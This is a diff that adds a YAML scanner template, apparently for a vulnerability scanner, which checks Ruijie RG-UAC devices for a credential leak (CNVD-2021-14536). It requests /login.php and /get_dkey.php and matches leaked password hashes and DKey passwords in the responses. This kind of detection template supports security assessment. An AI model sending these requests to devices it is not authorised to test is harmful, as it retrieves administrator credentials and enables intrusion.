@@ -1,0 +1,24 @@
+name: yaml-poc-ruijie-rg_uac-leak-CNVD-2021-14536
+binding: d7d1d10b-5d67-4c4d-aaf8-22f127ccfb1d
+detail:
+    author: system_user
+    vulnerability:
+        id: 8802704a-4cf1-4d6f-9414-8d66bb0d51a2
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /login.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("<title>RG-UACµÇÂ¼Ò³Ãæ</title>") && response.body_string.contains("get_dkey_passwd") && "\"password\":\"[a-f0-9]{32}\"".bmatches(response.body)
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /get_dkey.php
+            follow_redirects: false
+        expression: response.status == 200 && "(\"DKey\"|\"dkey_password\")\\s*:\\s*(.*),?".bmatches(response.body) && "^\\[(.*)\\]$".bmatches(response.body)
+expression: r0() || r1()
